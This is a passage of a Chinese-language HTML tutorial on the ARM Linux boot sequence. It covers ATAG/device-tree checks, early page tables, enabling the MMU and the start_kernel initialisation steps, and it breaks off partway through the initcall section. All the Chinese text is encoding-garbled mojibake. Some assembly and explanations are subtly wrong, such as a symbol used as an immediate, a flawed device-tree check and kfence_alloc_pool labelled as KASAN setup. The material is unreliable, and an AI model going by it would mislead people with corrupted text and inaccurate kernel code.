<h4 data-id="heading-46">5.3.1 éªŒè¯ç›®çš„</h4>
<p>ç¡®ä¿Bootloaderä¼ é€’çš„å‚æ•°æœ‰æ•ˆï¼š</p>
<ul>
<li>ATAGsæŒ‡é’ˆæœ‰æ•ˆ</li>
<li>æˆ–è®¾å¤‡æ ‘æŒ‡é’ˆæœ‰æ•ˆ</li>
<li>æ•°æ®ç»“æ„æ ¼å¼æ­£ç¡®</li>
</ul>
<h4 data-id="heading-47">5.3.2 éªŒè¯ä»£ç </h4>
<pre><code class="hljs language-assembly" lang="assembly">__vet_atags:
    // æ£€æŸ¥å¯¹é½
    tst r2, #0x3           @ æ£€æŸ¥æ˜¯å¦4å­—èŠ‚å¯¹é½
    bne 1f                 @ ä¸å¯¹é½åˆ™æ— æ•ˆ
    
    // æ£€æŸ¥ATAG_CORE
    ldr r5, [r2, #0]       @ è¯»å–ç¬¬ä¸€ä¸ªtag
    cmp r5, #ATAG_CORE_SIZE
    bne 1f                 @ ä¸æ˜¯ATAG_COREåˆ™æ— æ•ˆ
    
    // æ£€æŸ¥ATAG_COREæ ‡è®°
    ldr r5, [r2, #4]
    ldr r6, =ATAG_CORE
    cmp r5, r6
    bne 1f                 @ æ ‡è®°ä¸åŒ¹é…åˆ™æ— æ•ˆ
    
    // æˆ–è€…æ£€æŸ¥è®¾å¤‡æ ‘
    ldr r6, =OF_DT_MAGIC
    cmp r5, r6
    beq 2f                 @ æ˜¯è®¾å¤‡æ ‘åˆ™æœ‰æ•ˆ
    
1:  mov r2, #0             @ æ— æ•ˆï¼Œæ¸…ç©ºr2
2:  ret lr                 @ è¿”å›
</code></pre>
<h3 data-id="heading-48">5.4 é¡µè¡¨åˆ›å»º</h3>
<h4 data-id="heading-49">5.4.1 ä¸ºä»€ä¹ˆéœ€è¦é¡µè¡¨ï¼Ÿ</h4>
<p>MMUéœ€è¦é¡µè¡¨æ¥ï¼š</p>
<ul>
<li>å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€</li>
<li>è®¾ç½®å†…å­˜è®¿é—®æƒé™</li>
<li>å¯ç”¨å†…å­˜ä¿æŠ¤</li>
</ul>
<h4 data-id="heading-50">5.4.2 æ—©æœŸé¡µè¡¨ç»“æ„</h4>
<p>æ—©æœŸé¡µè¡¨åªæ˜ å°„å¿…è¦çš„åŒºåŸŸï¼š</p>
<pre><code class="hljs language-assembly" lang="assembly">__create_page_tables:
    // 1. æ¸…é™¤é¡µè¡¨
    mov r0, r4              @ r4æ˜¯é¡µè¡¨åœ°å€
    mov r3, #0
    add r6, r0, #PG_DIR_SIZE
1:  str r3, [r0], #4       @ æ¸…é›¶é¡µè¡¨
    teq r0, r6
    bne 1b
    
    // 2. æ˜ å°„å†…æ ¸ä»£ç æ®µ
    // åˆ›å»ºé¡µè¡¨é¡¹ï¼Œæ˜ å°„å†…æ ¸çš„.textæ®µ
    
    // 3. æ˜ å°„é¡µè¡¨è‡ªèº«
    // åˆ›å»ºé¡µè¡¨é¡¹ï¼Œæ˜ å°„é¡µè¡¨åŒºåŸŸ
</code></pre>
<h4 data-id="heading-51">5.4.3 é¡µè¡¨æ˜ å°„èŒƒå›´</h4>
<p>æ—©æœŸé¡µè¡¨é€šå¸¸æ˜ å°„ï¼š</p>
<ul>
<li><strong>å†…æ ¸ä»£ç æ®µ</strong> (.text): å¯æ‰§è¡Œã€åªè¯»</li>
<li><strong>å†…æ ¸æ•°æ®æ®µ</strong> (.data, .bss): å¯è¯»å†™</li>
<li><strong>é¡µè¡¨åŒºåŸŸ</strong>: å¯è¯»å†™</li>
<li><strong>è®¾å¤‡æ ‘/ATAGs</strong>: åªè¯»</li>
</ul>
<h3 data-id="heading-52">5.5 MMUå¯ç”¨</h3>
<h4 data-id="heading-53">5.5.1 MMUå¯ç”¨çš„æ­¥éª¤</h4>
<pre><code class="hljs language-assembly" lang="assembly">__enable_mmu:
    // 1. è®¾ç½®é¡µè¡¨åŸºå€
    mov r4, #swapper_pg_dir  @ é¡µè¡¨åœ°å€
    mcr p15, 0, r4, c2, c0, 0 @ å†™å…¥TTBR0
    
    // 2. è®¾ç½®åŸŸè®¿é—®æ§åˆ¶
    mov r5, #0x1fffffff      @ æ‰€æœ‰åŸŸä¸ºå®¢æˆ·ç«¯
    mcr p15, 0, r5, c3, c0, 0 @ å†™å…¥DACR
    
    // 3. è®¾ç½®MMUæ§åˆ¶å¯„å­˜å™¨
    mrc p15, 0, r0, c1, c0, 0 @ è¯»å–SCTLR
    orr r0, r0, #0x1         @ å¯ç”¨MMU
    mcr p15, 0, r0, c1, c0, 0 @ å†™å…¥SCTLR
    
    // 4. è·³è½¬åˆ°è™šæ‹Ÿåœ°å€
    b   __mmap_switched
</code></pre>
<h4 data-id="heading-54">5.5.2 MMUå¯ç”¨åçš„å˜åŒ–</h4>
<p>å¯ç”¨MMUåï¼š</p>
<ul>
<li><strong>åœ°å€ç©ºé—´</strong>: ä»ç‰©ç†åœ°å€åˆ‡æ¢åˆ°è™šæ‹Ÿåœ°å€</li>
<li><strong>å†…å­˜ä¿æŠ¤</strong>: å¯ä»¥è®¾ç½®è®¿é—®æƒé™</li>
<li><strong>Cache</strong>: å¯ä»¥å¯ç”¨CacheåŠ é€Ÿ</li>
</ul>
<h4 data-id="heading-55">5.5.3 åœ°å€åˆ‡æ¢</h4>
<pre><code class="hljs language-assembly" lang="assembly">__mmap_switched:
    // ç°åœ¨ä½¿ç”¨è™šæ‹Ÿåœ°å€
    // è®¾ç½®æ ˆæŒ‡é’ˆï¼ˆè™šæ‹Ÿåœ°å€ï¼‰
    ldr sp, =init_thread_union + THREAD_START_SP
    
    // ä¿å­˜å¤„ç†å™¨IDã€æœºå™¨ç±»å‹ã€ATAGsåœ°å€
    str r9, [r0]            @ ä¿å­˜å¤„ç†å™¨ID
    str r7, [r1]            @ ä¿å­˜æœºå™¨ç±»å‹
    str r8, [r2]            @ ä¿å­˜ATAGsåœ°å€
    
    // è·³è½¬åˆ°Cä»£ç 
    b   start_kernel
</code></pre>
<h3 data-id="heading-56">5.6 è·³è½¬åˆ°Cä»£ç </h3>
<h4 data-id="heading-57">5.6.1 è·³è½¬å‰çš„å‡†å¤‡</h4>
<p>åœ¨è·³è½¬åˆ°Cä»£ç å‰ï¼Œéœ€è¦ï¼š</p>
<ol>
<li><strong>å¯ç”¨MMU</strong>: å·²å®Œæˆ</li>
<li><strong>è®¾ç½®æ ˆæŒ‡é’ˆ</strong>: å·²å®Œæˆ</li>
<li><strong>æ¸…é™¤BSSæ®µ</strong>: éœ€è¦å®Œæˆ</li>
<li><strong>ä¿å­˜å¯åŠ¨å‚æ•°</strong>: å·²å®Œæˆ</li>
</ol>
<h4 data-id="heading-58">5.6.2 BSSæ®µæ¸…é™¤</h4>
<p>BSSæ®µåŒ…å«æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œéœ€è¦æ¸…é›¶ï¼š</p>
<pre><code class="hljs language-assembly" lang="assembly">// æ¸…é™¤BSSæ®µ
ldr r0, =__bss_start
ldr r1, =__bss_stop
mov r2, #0
1:  cmp r0, r1
    strlt r2, [r0], #4
    blt  1b
</code></pre>
<h4 data-id="heading-59">5.6.3 è·³è½¬åˆ°start_kernel</h4>
<pre><code class="hljs language-assembly" lang="assembly">// è·³è½¬åˆ°Cä»£ç å…¥å£
mov lr, #0
b   start_kernel
</code></pre>
<p>æ­¤æ—¶ï¼š</p>
<ul>
<li>MMUå·²å¯ç”¨</li>
<li>æ ˆå·²è®¾ç½®</li>
<li>BSSå·²æ¸…é™¤</li>
<li>å¯ä»¥å®‰å…¨åœ°è°ƒç”¨Cå‡½æ•°</li>
</ul>
<hr/>
<h2 data-id="heading-60">6. Cè¯­è¨€åˆå§‹åŒ– - start_kernel</h2>
<h3 data-id="heading-61">6.1 start_kernelæ¦‚è¿°</h3>
<h4 data-id="heading-62">6.1.1 start_kernelçš„ä½œç”¨</h4>
<p><code>start_kernel</code>æ˜¯å†…æ ¸Cè¯­è¨€ä»£ç çš„å…¥å£ç‚¹ï¼Œè´Ÿè´£ï¼š</p>
<ul>
<li>åˆå§‹åŒ–å†…æ ¸å„ä¸ªå­ç³»ç»Ÿ</li>
<li>è®¾ç½®å†…æ ¸è¿è¡Œç¯å¢ƒ</li>
<li>å¯åŠ¨ç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹</li>
</ul>
<h4 data-id="heading-63">6.1.2 start_kernelçš„ä½ç½®</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// init/main.c</span>
asmlinkage __visible <span class="hljs-type">void</span> __init __no_sanitize_address <span class="hljs-title function_">start_kernel</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
{
    <span class="hljs-comment">// å†…æ ¸åˆå§‹åŒ–ä»£ç </span>
}
</code></pre>
<h4 data-id="heading-64">6.1.3 start_kernelçš„æ‰§è¡Œç¯å¢ƒ</h4>
<p>æ‰§è¡Œ<code>start_kernel</code>æ—¶ï¼š</p>
<ul>
<li><strong>MMU</strong>: å·²å¯ç”¨</li>
<li><strong>ä¸­æ–­</strong>: å·²ç¦ç”¨</li>
<li><strong>å½“å‰è¿›ç¨‹</strong>: init_taskï¼ˆå†…æ ¸çš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼‰</li>
<li><strong>æ ˆ</strong>: ä½¿ç”¨init_taskçš„æ ˆ</li>
</ul>
<h3 data-id="heading-65">6.2 æ—©æœŸåˆå§‹åŒ–</h3>
<h4 data-id="heading-66">6.2.1 æ ˆæº¢å‡ºæ£€æµ‹è®¾ç½®</h4>
<pre><code class="hljs language-c" lang="c">set_task_stack_end_magic(&amp;init_task);
</code></pre>
<p><strong>ä½œç”¨</strong>: åœ¨init_taskæ ˆçš„æœ«å°¾è®¾ç½®é­”æ•°ï¼Œç”¨äºæ£€æµ‹æ ˆæº¢å‡ºã€‚</p>
<p><strong>åŸç†</strong>: å¦‚æœæ ˆæº¢å‡ºï¼Œä¼šè¦†ç›–æ ˆæœ«å°¾çš„é­”æ•°ï¼Œå†…æ ¸å¯ä»¥æ£€æµ‹åˆ°ã€‚</p>
<h4 data-id="heading-67">6.2.2 å¤„ç†å™¨IDè®¾ç½®</h4>
<pre><code class="hljs language-c" lang="c">smp_setup_processor_id();
</code></pre>
<p><strong>ä½œç”¨</strong>: è®¾ç½®å½“å‰CPUçš„IDã€‚</p>
<p><strong>ç”¨é€”</strong>: ç”¨äºSMPï¼ˆå¤šæ ¸ï¼‰ç³»ç»Ÿä¸­è¯†åˆ«å½“å‰CPUã€‚</p>
<h4 data-id="heading-68">6.2.3 è°ƒè¯•å¯¹è±¡æ—©æœŸåˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">debug_objects_early_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–è°ƒè¯•å¯¹è±¡è·Ÿè¸ªç³»ç»Ÿã€‚</p>
<p><strong>ç”¨é€”</strong>: ç”¨äºæ£€æµ‹å†…æ ¸å¯¹è±¡çš„ä½¿ç”¨é”™è¯¯ï¼ˆå¦‚ä½¿ç”¨å·²é‡Šæ”¾çš„å¯¹è±¡ï¼‰ã€‚</p>
<h4 data-id="heading-69">6.2.4 æ„å»ºIDåˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">init_vmlinux_build_id();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–å†…æ ¸æ„å»ºIDã€‚</p>
<p><strong>ç”¨é€”</strong>: ç”¨äºè°ƒè¯•ï¼Œæ ‡è¯†å†…æ ¸ç‰ˆæœ¬å’Œæ„å»ºä¿¡æ¯ã€‚</p>
<h4 data-id="heading-70">6.2.5 Cgroupæ—©æœŸåˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">cgroup_init_early();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–æ§åˆ¶ç»„ï¼ˆcgroupï¼‰å­ç³»ç»Ÿã€‚</p>
<p><strong>ç”¨é€”</strong>: ç”¨äºèµ„æºé™åˆ¶å’Œè¿›ç¨‹åˆ†ç»„ã€‚</p>
<h3 data-id="heading-71">6.3 ä¸­æ–­å’Œé”åˆå§‹åŒ–</h3>
<h4 data-id="heading-72">6.3.1 ç¦ç”¨ä¸­æ–­</h4>
<pre><code class="hljs language-c" lang="c">local_irq_disable();
early_boot_irqs_disabled = <span class="hljs-literal">true</span>;
</code></pre>
<p><strong>ä½œç”¨</strong>: ç¡®ä¿åœ¨æ—©æœŸåˆå§‹åŒ–æœŸé—´ä¸­æ–­è¢«ç¦ç”¨ã€‚</p>
<p><strong>åŸå› </strong>: æ—©æœŸåˆå§‹åŒ–æ—¶ï¼Œä¸­æ–­å¤„ç†å¯èƒ½è¿˜æœªå‡†å¤‡å¥½ã€‚</p>
<h4 data-id="heading-73">6.3.2 å¼•å¯¼CPUåˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">boot_cpu_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–å¼•å¯¼CPUï¼ˆç¬¬ä¸€ä¸ªCPUï¼‰ã€‚</p>
<p><strong>ä»»åŠ¡</strong>:</p>
<ul>
<li>æ ‡è®°CPUä¸ºåœ¨çº¿çŠ¶æ€</li>
<li>è®¾ç½®CPUçš„æ©ç </li>
<li>åˆå§‹åŒ–CPUç›¸å…³çš„æ•°æ®ç»“æ„</li>
</ul>
<h4 data-id="heading-74">6.3.3 é¡µåœ°å€åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">page_address_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–é¡µåœ°å€æ˜ å°„ç³»ç»Ÿã€‚</p>
<p><strong>ç”¨é€”</strong>: ç”¨äºå°†ç‰©ç†é¡µæ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ã€‚</p>
<h3 data-id="heading-75">6.4 æ¶æ„ç›¸å…³åˆå§‹åŒ–</h3>
<h4 data-id="heading-76">6.4.1 setup_arch</h4>
<pre><code class="hljs language-c" lang="c">setup_arch(&amp;command_line);
</code></pre>
<p><strong>ä½œç”¨</strong>: æ‰§è¡Œæ¶æ„ç›¸å…³çš„åˆå§‹åŒ–ã€‚</p>
<p><strong>ä¸»è¦ä»»åŠ¡</strong>:</p>
<ol>
<li><strong>è§£æå¯åŠ¨å‚æ•°</strong>: è§£æATAGsæˆ–è®¾å¤‡æ ‘</li>
<li><strong>å†…å­˜åˆå§‹åŒ–</strong>: åˆå§‹åŒ–å†…å­˜ç®¡ç†</li>
<li><strong>CPUåˆå§‹åŒ–</strong>: åˆå§‹åŒ–CPUç‰¹å®šåŠŸèƒ½</li>
<li><strong>è®¾å¤‡æ ‘è§£æ</strong>: è§£æè®¾å¤‡æ ‘ï¼Œåˆå§‹åŒ–è®¾å¤‡</li>
<li><strong>å‘½ä»¤è¡Œå‚æ•°</strong>: æå–å†…æ ¸å‘½ä»¤è¡Œå‚æ•°</li>
</ol>
<p><strong>ä»£ç ä½ç½®</strong>: <code>arch/arm/kernel/setup.c</code></p>
<h4 data-id="heading-77">6.4.2 å†…å­˜åˆå§‹åŒ–</h4>
<p>åœ¨<code>setup_arch</code>ä¸­ï¼Œä¼šåˆå§‹åŒ–å†…å­˜ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// è§£æå†…å­˜ä¿¡æ¯ï¼ˆä»ATAGsæˆ–è®¾å¤‡æ ‘ï¼‰</span>
setup_machine_fdt(__atags_pointer);
<span class="hljs-comment">// æˆ–</span>
setup_machine_tags(__atags_pointer);

<span class="hljs-comment">// åˆå§‹åŒ–memblockï¼ˆæ—©æœŸå†…å­˜åˆ†é…å™¨ï¼‰</span>
arm_memblock_init();
</code></pre>
<h4 data-id="heading-78">6.4.3 è®¾å¤‡æ ‘è§£æ</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// è§£æè®¾å¤‡æ ‘</span>
unflatten_device_tree();

<span class="hljs-comment">// åˆå§‹åŒ–è®¾å¤‡</span>
of_platform_populate();
</code></pre>
<h3 data-id="heading-79">6.5 å‘½ä»¤è¡Œå‚æ•°å¤„ç†</h3>
<h4 data-id="heading-80">6.5.1 ä¿å­˜å‘½ä»¤è¡Œ</h4>
<pre><code class="hljs language-c" lang="c">setup_command_line(command_line);
</code></pre>
<p><strong>ä½œç”¨</strong>: ä¿å­˜åŸå§‹å’Œè§£æåçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<p><strong>ä¿å­˜çš„å†…å®¹</strong>:</p>
<ul>
<li><code>saved_command_line</code>: åŸå§‹å‘½ä»¤è¡Œ</li>
<li><code>static_command_line</code>: è§£æåçš„å‘½ä»¤è¡Œ</li>
</ul>
<h4 data-id="heading-81">6.5.2 è§£ææ—©æœŸå‚æ•°</h4>
<pre><code class="hljs language-c" lang="c">parse_early_param();
</code></pre>
<p><strong>ä½œç”¨</strong>: è§£æéœ€è¦åœ¨æ—©æœŸå¤„ç†çš„å‚æ•°ã€‚</p>
<p><strong>æ—©æœŸå‚æ•°ç¤ºä¾‹</strong>:</p>
<ul>
<li><code>console=</code>: è®¾ç½®æ§åˆ¶å°</li>
<li><code>earlyprintk=</code>: æ—©æœŸæ‰“å°</li>
<li><code>mem=</code>: å†…å­˜å¤§å°</li>
<li><code>initrd=</code>: initrdåœ°å€</li>
</ul>
<h4 data-id="heading-82">6.5.3 è§£æå¸¸è§„å‚æ•°</h4>
<pre><code class="hljs language-c" lang="c">parse_args(<span class="hljs-string">"Booting kernel"</span>, static_command_line, ...);
</code></pre>
<p><strong>ä½œç”¨</strong>: è§£ææ‰€æœ‰å†…æ ¸å‚æ•°ã€‚</p>
<p><strong>å‚æ•°ç±»å‹</strong>:</p>
<ul>
<li>æ¨¡å—å‚æ•°</li>
<li>å†…æ ¸é€‰é¡¹</li>
<li>ä¼ é€’ç»™initçš„å‚æ•°</li>
</ul>
<h3 data-id="heading-83">6.6 å†…å­˜ç®¡ç†åˆå§‹åŒ–</h3>
<h4 data-id="heading-84">6.6.1 å†…å­˜ç®¡ç†æ¦‚è¿°</h4>
<p>å†…å­˜ç®¡ç†æ˜¯å†…æ ¸çš„æ ¸å¿ƒå­ç³»ç»Ÿï¼Œéœ€è¦æ—©æœŸåˆå§‹åŒ–ã€‚</p>
<h4 data-id="heading-85">6.6.2 æ„å»ºå†…å­˜åŒºåŸŸåˆ—è¡¨</h4>
<pre><code class="hljs language-c" lang="c">build_all_zonelists(<span class="hljs-literal">NULL</span>);
</code></pre>
<p><strong>ä½œç”¨</strong>: æ„å»ºæ‰€æœ‰èŠ‚ç‚¹çš„å†…å­˜åŒºåŸŸåˆ—è¡¨ã€‚</p>
<p><strong>å†…å­˜åŒºåŸŸç±»å‹</strong>:</p>
<ul>
<li><strong>ZONE_DMA</strong>: DMAå¯ç”¨å†…å­˜</li>
<li><strong>ZONE_NORMAL</strong>: æ™®é€šå†…å­˜</li>
<li><strong>ZONE_HIGHMEM</strong>: é«˜ç«¯å†…å­˜ï¼ˆ32ä½ç³»ç»Ÿï¼‰</li>
</ul>
<h4 data-id="heading-86">6.6.3 é¡µåˆ†é…å™¨åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">page_alloc_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–é¡µåˆ†é…å™¨ã€‚</p>
<p><strong>é¡µåˆ†é…å™¨</strong>: è´Ÿè´£åˆ†é…å’Œé‡Šæ”¾ç‰©ç†é¡µã€‚</p>
<h4 data-id="heading-87">6.6.4 å®Œæ•´å†…å­˜ç®¡ç†åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">mm_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: å®Œæ•´åˆå§‹åŒ–å†…å­˜ç®¡ç†å­ç³»ç»Ÿã€‚</p>
<p><strong>ä¸»è¦ä»»åŠ¡</strong>:</p>
<ol>
<li><strong>é¡µæ‰©å±•åˆå§‹åŒ–</strong>: <code>page_ext_init_flatmem()</code></li>
<li><strong>å†…å­˜è°ƒè¯•</strong>: <code>init_mem_debugging_and_hardening()</code></li>
<li><strong>KASANåˆå§‹åŒ–</strong>: <code>kfence_alloc_pool()</code>ï¼ˆå¦‚æœå¯ç”¨ï¼‰</li>
<li><strong>å†…å­˜åˆå§‹åŒ–æŠ¥å‘Š</strong>: <code>report_meminit()</code></li>
<li><strong>æ ˆä»“åº“åˆå§‹åŒ–</strong>: <code>stack_depot_init()</code></li>
<li><strong>å†…å­˜åˆå§‹åŒ–</strong>: <code>mem_init()</code></li>
<li><strong>SLABåˆ†é…å™¨åˆå§‹åŒ–</strong>: <code>kmem_cache_init()</code></li>
<li><strong>Kmemleakåˆå§‹åŒ–</strong>: <code>kmemleak_init()</code></li>
<li><strong>é¡µè¡¨åˆå§‹åŒ–</strong>: <code>pgtable_init()</code></li>
<li><strong>vmallocåˆå§‹åŒ–</strong>: <code>vmalloc_init()</code></li>
</ol>
<h3 data-id="heading-88">6.7 è°ƒåº¦å™¨åˆå§‹åŒ–</h3>
<h4 data-id="heading-89">6.7.1 è°ƒåº¦å™¨æ¦‚è¿°</h4>
<p>è°ƒåº¦å™¨è´Ÿè´£å†³å®šå“ªä¸ªè¿›ç¨‹åœ¨CPUä¸Šè¿è¡Œã€‚</p>
<h4 data-id="heading-90">6.7.2 è°ƒåº¦å™¨åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">sched_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–è¿›ç¨‹è°ƒåº¦å™¨ã€‚</p>
<p><strong>ä¸»è¦ä»»åŠ¡</strong>:</p>
<ol>
<li><strong>åˆå§‹åŒ–è¿è¡Œé˜Ÿåˆ—</strong>: ä¸ºæ¯ä¸ªCPUåˆ›å»ºè¿è¡Œé˜Ÿåˆ—</li>
<li><strong>åˆå§‹åŒ–è°ƒåº¦ç±»</strong>: åˆå§‹åŒ–CFSã€RTç­‰è°ƒåº¦ç±»</li>
<li><strong>åˆå§‹åŒ–è´Ÿè½½å‡è¡¡</strong>: åˆå§‹åŒ–è´Ÿè½½å‡è¡¡å™¨</li>
<li><strong>è®¾ç½®è°ƒåº¦åŸŸ</strong>: è®¾ç½®CPUè°ƒåº¦åŸŸ</li>
</ol>
<p><strong>ä»£ç ä½ç½®</strong>: <code>kernel/sched/core.c</code></p>
<h4 data-id="heading-91">6.7.3 ä¸ºä»€ä¹ˆéœ€è¦æ—©æœŸåˆå§‹åŒ–è°ƒåº¦å™¨ï¼Ÿ</h4>
<p>è°ƒåº¦å™¨éœ€è¦æ—©æœŸåˆå§‹åŒ–ï¼Œå› ä¸ºï¼š</p>
<ul>
<li>åç»­çš„åˆå§‹åŒ–å¯èƒ½åˆ›å»ºå†…æ ¸çº¿ç¨‹</li>
<li>å†…æ ¸çº¿ç¨‹éœ€è¦è°ƒåº¦å™¨æ¥è¿è¡Œ</li>
<li>å¤šæ ¸ç³»ç»Ÿéœ€è¦è°ƒåº¦å™¨æ¥åˆ†é…ä»»åŠ¡</li>
</ul>
<h3 data-id="heading-92">6.8 ä¸­æ–­ç³»ç»Ÿåˆå§‹åŒ–</h3>
<h4 data-id="heading-93">6.8.1 ä¸­æ–­æ¦‚è¿°</h4>
<p>ä¸­æ–­æ˜¯ç¡¬ä»¶é€šçŸ¥CPUæœ‰äº‹ä»¶å‘ç”Ÿçš„æ–¹å¼ã€‚</p>
<h4 data-id="heading-94">6.8.2 æ—©æœŸä¸­æ–­åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">early_irq_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: æ—©æœŸåˆå§‹åŒ–ä¸­æ–­ç³»ç»Ÿã€‚</p>
<p><strong>ä»»åŠ¡</strong>:</p>
<ul>
<li>åˆå§‹åŒ–ä¸­æ–­æè¿°ç¬¦</li>
<li>è®¾ç½®ä¸­æ–­å‘é‡è¡¨</li>
<li>åˆå§‹åŒ–ä¸­æ–­æ§åˆ¶å™¨</li>
</ul>
<h4 data-id="heading-95">6.8.3 å®Œæ•´ä¸­æ–­åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">init_IRQ();
</code></pre>
<p><strong>ä½œç”¨</strong>: å®Œæ•´åˆå§‹åŒ–ä¸­æ–­ç³»ç»Ÿã€‚</p>
<p><strong>ä»»åŠ¡</strong>:</p>
<ul>
<li>åˆå§‹åŒ–æ‰€æœ‰ä¸­æ–­</li>
<li>è®¾ç½®ä¸­æ–­å¤„ç†å‡½æ•°</li>
<li>å¯ç”¨ä¸­æ–­æ§åˆ¶å™¨</li>
</ul>
<h4 data-id="heading-96">6.8.4 ä¸­æ–­å¤„ç†æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç¡¬ä»¶äº§ç”Ÿä¸­æ–­
<span class="hljs-code">    â†“
ä¸­æ–­æ§åˆ¶å™¨é€šçŸ¥CPU
    â†“
CPUè·³è½¬åˆ°ä¸­æ–­å‘é‡
    â†“
è°ƒç”¨ä¸­æ–­å¤„ç†å‡½æ•°
    â†“
æ‰§è¡Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹
    â†“
è¿”å›è¢«ä¸­æ–­çš„ä»£ç 
</span></code></pre>
<h3 data-id="heading-97">6.9 å®šæ—¶å™¨åˆå§‹åŒ–</h3>
<h4 data-id="heading-98">6.9.1 å®šæ—¶å™¨æ¦‚è¿°</h4>
<p>å®šæ—¶å™¨ç”¨äºï¼š</p>
<ul>
<li>æ—¶é—´æµ‹é‡</li>
<li>å»¶è¿Ÿæ‰§è¡Œ</li>
<li>å‘¨æœŸæ€§ä»»åŠ¡</li>
</ul>
<h4 data-id="heading-99">6.9.2 å®šæ—¶å™¨åˆå§‹åŒ–æ­¥éª¤</h4>
<pre><code class="hljs language-c" lang="c">tick_init();           <span class="hljs-comment">// åˆå§‹åŒ–tick</span>
init_timers();         <span class="hljs-comment">// åˆå§‹åŒ–å®šæ—¶å™¨</span>
hrtimers_init();       <span class="hljs-comment">// åˆå§‹åŒ–é«˜ç²¾åº¦å®šæ—¶å™¨</span>
timekeeping_init();    <span class="hljs-comment">// åˆå§‹åŒ–æ—¶é—´ä¿æŒ</span>
time_init();           <span class="hljs-comment">// æ¶æ„ç›¸å…³æ—¶é—´åˆå§‹åŒ–</span>
</code></pre>
<h4 data-id="heading-100">6.9.3 æ—¶é—´ç³»ç»Ÿ</h4>
<pre><code class="hljs language-c" lang="c">timekeeping_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–å†…æ ¸æ—¶é—´ç³»ç»Ÿã€‚</p>
<p><strong>æ—¶é—´ç³»ç»ŸåŒ…æ‹¬</strong>:</p>
<ul>
<li><strong>ç³»ç»Ÿæ—¶é—´</strong>: ä»1970å¹´1æœˆ1æ—¥å¼€å§‹çš„ç§’æ•°</li>
<li><strong>å•è°ƒæ—¶é—´</strong>: ä»å¯åŠ¨å¼€å§‹çš„çº³ç§’æ•°</li>
<li><strong>æ—¶é’Ÿæº</strong>: ç¡¬ä»¶æ—¶é’Ÿæºï¼ˆå¦‚RTCã€TSCï¼‰</li>
</ul>
<h3 data-id="heading-101">6.10 æ§åˆ¶å°åˆå§‹åŒ–</h3>
<h4 data-id="heading-102">6.10.1 æ§åˆ¶å°æ¦‚è¿°</h4>
<p>æ§åˆ¶å°ç”¨äºå†…æ ¸è¾“å‡ºä¿¡æ¯ï¼Œæ˜¯è°ƒè¯•å’Œç›‘æ§çš„é‡è¦å·¥å…·ã€‚</p>
<h4 data-id="heading-103">6.10.2 æ§åˆ¶å°åˆå§‹åŒ–</h4>
<pre><code class="hljs language-c" lang="c">console_init();
</code></pre>
<p><strong>ä½œç”¨</strong>: åˆå§‹åŒ–æ§åˆ¶å°ç³»ç»Ÿã€‚</p>
<p><strong>ä»»åŠ¡</strong>:</p>
<ol>
<li><strong>æ³¨å†Œæ§åˆ¶å°é©±åŠ¨</strong>: æ³¨å†Œä¸²å£ã€VGAç­‰æ§åˆ¶å°</li>
<li><strong>è®¾ç½®é»˜è®¤æ§åˆ¶å°</strong>: é€‰æ‹©é»˜è®¤è¾“å‡ºè®¾å¤‡</li>
<li><strong>å¯ç”¨æ§åˆ¶å°è¾“å‡º</strong>: å…è®¸å†…æ ¸æ‰“å°ä¿¡æ¯</li>
</ol>
<h4 data-id="heading-104">6.10.3 æ§åˆ¶å°ç±»å‹</h4>
<ul>
<li><strong>ä¸²å£æ§åˆ¶å°</strong>: é€šè¿‡UARTè¾“å‡º</li>
<li><strong>VGAæ§åˆ¶å°</strong>: é€šè¿‡VGAæ˜¾ç¤º</li>
<li><strong>ç½‘ç»œæ§åˆ¶å°</strong>: é€šè¿‡ç½‘ç»œè¾“å‡º</li>
<li><strong>USBæ§åˆ¶å°</strong>: é€šè¿‡USBè¾“å‡º</li>
</ul>
<h3 data-id="heading-105">6.11 Initcallæœºåˆ¶</h3>
<h4 data-id="heading-106">6.11.1 Initcallæ¦‚è¿°</h4>
<p>Initcallæ˜¯å†…æ ¸çš„åˆå§‹åŒ–è°ƒç”¨æœºåˆ¶ï¼Œç”¨äºæŒ‰é¡ºåºåˆå§‹åŒ–å„ä¸ªå­ç³»ç»Ÿã€‚</p>
<h4 data-id="heading-107">6.11.2 Initcallçº§åˆ«</h4>
<p>å†…æ ¸å®šä¹‰äº†å¤šä¸ªinitcallçº§åˆ«ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// å®šä¹‰åœ¨ include/linux/init.h</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> __define_initcall(fn, id) \
